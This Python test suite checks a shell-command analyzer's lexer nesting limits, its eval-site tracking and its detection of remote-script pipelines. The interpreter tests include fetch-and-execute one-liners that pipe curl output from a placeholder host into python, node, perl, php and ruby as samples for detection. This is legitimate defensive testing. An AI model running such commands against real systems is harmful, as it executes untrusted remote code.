"""Security-boundary mutation falsifiers for shell syntax and eval inference.

Pure synthetic command strings; no shell execution or network activity.
"""
from __future__ import annotations

import unittest

from falsicore import shell_syntax as syntax


class BoundedLexing(unittest.TestCase):
    def test_lexical_nesting_threshold_is_exact_and_bounded(self):
        self.assertEqual(syntax.MAX_LEX_NESTING, 48)
        self.assertEqual(syntax._balanced("()", 1, nesting=47), 2)
        with self.assertRaises(syntax._NestingLimit):
            syntax._balanced("()", 1, nesting=48)
        accepted = "(" * 47 + ")" * 47
        self.assertEqual(syntax._balanced(accepted, 1), len(accepted))
        with self.assertRaises(syntax._NestingLimit):
            syntax._balanced("(" * 48 + ")" * 48, 1)

    def test_quote_recursion_is_bounded_at_each_transition(self):
        quote_with_brace = '("$' + '{x}")'
        self.assertEqual(syntax._balanced(quote_with_brace, 1, nesting=45),
                         len(quote_with_brace))
        with self.assertRaises(syntax._NestingLimit):
            syntax._balanced(quote_with_brace, 1, nesting=46)
        for quoted in ('"$(printf ok)"', '"$' + '{value}"'):
            with self.subTest(quoted=quoted):
                self.assertEqual(syntax._double_quote_end(quoted, 1, nesting=46),
                                 len(quoted))
                with self.assertRaises(syntax._NestingLimit):
                    syntax._double_quote_end(quoted, 1, nesting=47)

    def test_preceding_partial_token_is_preserved_on_nesting_limit(self):
        script = 'echo prefix"' + ("$" + "{x:-") * 90 + "payload" + "}" * 90 + '"'
        gaps: set[str] = set()
        tokens = syntax._lex(script, gaps)
        self.assertIn("NESTING_LIMIT", gaps)
        self.assertEqual([w.text for w in tokens if isinstance(w, syntax.Word)],
                         ["echo", "prefix"])


class EvalSitePropagation(unittest.TestCase):
    def test_nested_qualified_eval_is_not_lost(self):
        result = syntax.analyze("bash -c 'eval \"$(dircolors -b)\"'")
        self.assertEqual(result["qualified_eval_sites"], ["dircolors"])
        self.assertEqual(result["unresolved_non_eval_sites"], 0)

    def test_nested_unresolved_site_cannot_be_subtracted(self):
        result = syntax.analyze("bash -c '$CMD; eval \"$(dircolors -b)\"'")
        self.assertEqual(result["qualified_eval_sites"], ["dircolors"])
        self.assertEqual(result["unresolved_non_eval_sites"], 1)

    def test_broken_process_substitution_index_is_explicitly_unknown(self):
        cmd = syntax.Command(words=[
            syntax.Word("source", 1), syntax.Word("\x00PROCSUB19\x00", 1)])
        analysis = syntax._Analysis(0)
        analysis.command(cmd)
        self.assertIn("EXPANSION_NOT_RESOLVED", analysis.gaps)
        self.assertEqual(analysis.unresolved_non_eval_sites, 1)


class InterpreterCodeOperand(unittest.TestCase):
    def test_all_supported_inline_code_flags_attribute_the_exact_operand(self):
        samples = (
            'python3 -c "$(curl https://fixture.invalid/script)"',
            'python3 -u -c "$(curl https://fixture.invalid/script)"',
            'node --eval "$(curl https://fixture.invalid/script)"',
            'node -e "$(curl https://fixture.invalid/script)"',
            'perl -e "$(curl https://fixture.invalid/script)"',
            'php -r "$(curl https://fixture.invalid/script)"',
            'ruby -e "$(curl https://fixture.invalid/script)"',
        )
        for sample in samples:
            with self.subTest(sample=sample):
                result = syntax.analyze(sample)
                self.assertIn("REMOTE_SCRIPT_PIPELINE", result["patterns"])
                self.assertIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED",
                              result["limitations"])

    def test_extra_arguments_do_not_taint_inline_code(self):
        samples = (
            'python3 -c "print(1)" "$(curl https://fixture.invalid/data)"',
            'python3 -u -c "print(1)" "$(curl https://fixture.invalid/data)"',
            'node --eval "console.log(1)" "$(curl https://fixture.invalid/data)"',
            'node -e "console.log(1)" "$(curl https://fixture.invalid/data)"',
        )
        for sample in samples:
            with self.subTest(sample=sample):
                self.assertNotIn("REMOTE_SCRIPT_PIPELINE",
                                 syntax.analyze(sample)["patterns"])

    def test_empty_code_operand_is_bounded_without_an_index_error(self):
        for sample in ("python3 -c", "node --eval", "perl -e"):
            with self.subTest(sample=sample):
                result = syntax.analyze(sample)
                self.assertIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED",
                              result["limitations"])


if __name__ == "__main__":
    unittest.main()
